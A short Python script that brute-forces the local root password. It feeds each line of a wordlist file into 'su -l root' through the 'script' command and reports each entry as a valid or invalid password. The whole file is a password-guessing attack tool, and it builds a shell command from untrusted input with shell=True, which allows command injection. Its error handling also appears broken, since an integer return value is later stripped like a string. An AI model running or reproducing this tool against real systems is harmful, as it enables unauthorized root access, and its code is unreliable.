import subprocess
FAIL = b'Password: \r\nsu: Authentication failure'
FILE = './list.txt'

def validate_pass(passwd):
    ret = 0
    try:
        cmd = '{ sleep 1; echo "%s"; } | script -q -c "su -l root -c ls /root" /dev/null' % passwd
        ret = subprocess.check_output(cmd, shell=True)
        return ret
    except:
        return 1

#passwd = getpass.getpass(prompt='Password: ', stream=None)
def verify(passwd):
  res = validate_pass(passwd).strip()
  if FAIL == res:
    print (passwd.strip() + ":Invalid password")
  else:
    print (passwd.rstrip() + ":Valid password")

def main():
  with open(FILE, 'r') as f:
    data = f.readlines()
  for password in data:
    verify(password)

if __name__ == '__main__':
    main()
